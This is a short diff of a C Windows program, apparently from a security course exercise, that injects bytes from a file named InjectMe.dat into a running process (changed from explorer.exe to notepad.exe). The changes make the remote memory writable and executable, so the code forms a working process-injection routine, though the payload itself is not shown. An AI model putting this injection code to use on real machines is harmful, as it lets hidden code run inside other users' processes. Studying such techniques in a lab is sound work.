@@ -81,7 +81,7 @@ int _tmain(int argc, _TCHAR* argv[]) {
 	fopen_s(&f, "c:\\temp.txt", "w");
 	fclose(f);
 
-	int pid = findProcessByName("explorer.exe");
+	int pid = findProcessByName("notepad.exe");
 	if (pid == NULL) {
 		_die("Failed to find explorer.exe");
 	}
@@ -97,20 +97,20 @@ int _tmain(int argc, _TCHAR* argv[]) {
 	fclose(f);
 
 	FILE* inject = NULL;
-	byte buf[197];
+	byte buf[201];
 	int ret =fopen_s(&inject,"C:\\Documents and Settings\\Administrator\\My Documents\\GitHub\\kj-security-ex1\\ex4\\InjectMe.dat","rb");
 	if (NULL != ret){
 
 		_die("Failed to open InjectMe !");
 	}
-	size_t bytesRead = fread(buf,1,197,inject);
-	if (197 != bytesRead){
+	size_t bytesRead = fread(buf,1,201,inject);
+	if (201 != bytesRead){
 		_die("Failed to read enough !");
 	}
 	
 	fclose(inject);
 
-	LPVOID address = VirtualAllocEx(process, NULL, bytesRead, MEM_COMMIT, PAGE_READWRITE);
+	LPVOID address = VirtualAllocEx(process, NULL, bytesRead, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (address == NULL) {
 		CloseHandle(process);
 		_die("Failed to VirtualAllocEx !");
@@ -125,7 +125,7 @@ int _tmain(int argc, _TCHAR* argv[]) {
 		_die("Failed to write enough memory !");
 	}
 	DWORD oldProtect = NULL;
-	BOOL changed = VirtualProtectEx(process,address,sizeof(buf),PAGE_EXECUTE_READ,&oldProtect);
+	BOOL changed = VirtualProtectEx(process,address,sizeof(buf),PAGE_EXECUTE_READWRITE,&oldProtect);
 	if (!changed){
 				int err = GetLastError();
 		fopen_s(&f, "c:\\temp.txt", "a");
